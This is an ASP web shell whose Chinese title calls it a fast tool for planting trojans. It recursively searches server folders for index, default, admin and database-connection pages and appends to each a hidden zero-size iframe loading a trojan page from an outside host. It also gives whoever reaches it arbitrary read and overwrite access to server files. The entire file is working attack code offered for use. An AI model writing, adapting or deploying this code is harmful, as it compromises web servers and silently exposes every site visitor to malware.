<%
Server.ScriptTimeout=10000 
Response.Buffer=False 
%> 
<html> 
<head> 
<title></title> 
白沙极速Shell挂马,→Basa
</head> 
<body> 
<% 
ASP_SELF=Request.ServerVariables("PATH_INFO") 
s=Request("fd") 
ex=Request("ex") 
pth=Request("pth") 
newcnt=Request("newcnt") 
If ex<>"" AND pth<>"" Then 
select Case ex 
Case "edit" 
CALL file_show(pth) 
Case "save" 
CALL file_save(pth) 
End select 
Else 
%> 
<form action="<%=ASP_SELF%>" method="POST"> 
输入文件夹路径 (绝对路径): 
<input type="text" name="fd" size="40"> 
<input type="submit" value="确定"> 
</form> 
<%End If%> 
<% 
Function IsPattern(patt,str) 
Set regEx=New RegExp 
regEx.Pattern=patt 
regEx.IgnoreCase=True 
retVal=regEx.Test(str) 
Set regEx=Nothing 
If retVal=True Then 
IsPattern=True 
Else 
IsPattern=False 
End If 
End Function 
If IsPattern("[^ab]{1}:{1}(\\|\/)",s) Then 
sch s 
Else 
If s<>"" Then Response.Write "Invalid Agrument!" 
End If 
Sub sch(s) 
oN eRrOr rEsUmE nExT 
Set fs=Server.createObject("Scripting.FileSystemObject") 
Set fd=fs.GetFolder(s) 
Set fi=fd.Files 
Set sf=fd.SubFolders 
For Each f in fi 
rtn=f.Path 
step_all rtn 
Next 
If sf.Count<>0 Then 
For Each l In sf 
sch l 
Next 
End If 
End Sub 
Sub step_all(agr) 
retVal=IsPattern("(\\|\/)(default|index|index2|index_bak|dbconn|database|upfile|admin_main|admin1)\.(htm|html|asp|php|jsp|aspx|cgi)\b",agr) 
If retVal Then 
step1 agr 
step2 agr 
Else 
Exit Sub 
End If 
End Sub 
%> 
<%Sub step1(str1)%> 
<a href="<%=ASP_SELF%>?ex=edit&pth=<%=str1%>" target="_blank"><%=str1%></a><br> 
<%End Sub%> 
<% 
Sub step2(str2) 
addcode="<iframe src=http://www.hackol.com/muma.htm width=0 height=0 frameborder=0></iframe>" 
Set fs=Server.createObject("Scripting.FileSystemObject") 
isExist=fs.FileExists(str2) 
If isExist Then 
Set f=fs.GetFile(str2) 
Set f_addcode=f.OpenAsTextStream(8,-2) 
f_addcode.Write addcode 
f_addcode.Close 
Set f=Nothing 
End If 
Set fs=Nothing 
End Sub 
%> 
<% 
Sub file_show(fname) 
Set fs1=Server.createObject("Scripting.FileSystemObject") 
isExist=fs1.FileExists(fname) 
If isExist Then 
Set fcnt=fs1.OpenTextFile(fname) 
cnt=fcnt.ReadAll 
fcnt.Close 
Set fs1=Nothing%> 
FILE: <%=fname%> 
<form action="<%=ASP_SELF%>" method="POST"> 
<textarea name="newcnt" cols="100" rows="30"><%=cnt%></textarea> 
<input type="hidden" name="pth" value="<%=fname%>"> 
<input type="hidden" name="ex" value="save"> 
<input type="submit" value="SAVE"> 
</form> 
<%Else%> 
<p>THE FILE IS NOT EXIT OR HAVE deleteD.</p> 
<% 
End If 
End Sub 
%> 
<% 
Sub file_save(fname) 
Set fs2=Server.createObject("Scripting.FileSystemObject") 
Set newf=fs2.createTextFile(fname,True) 
newf.Write newcnt 
newf.Close 
Set fs2=Nothing 
Response.Write "<p>THE FILE WAS MODIFIED SUCCESSFULLY.</p>"  
End Sub 
%> 
</body> 
</html>


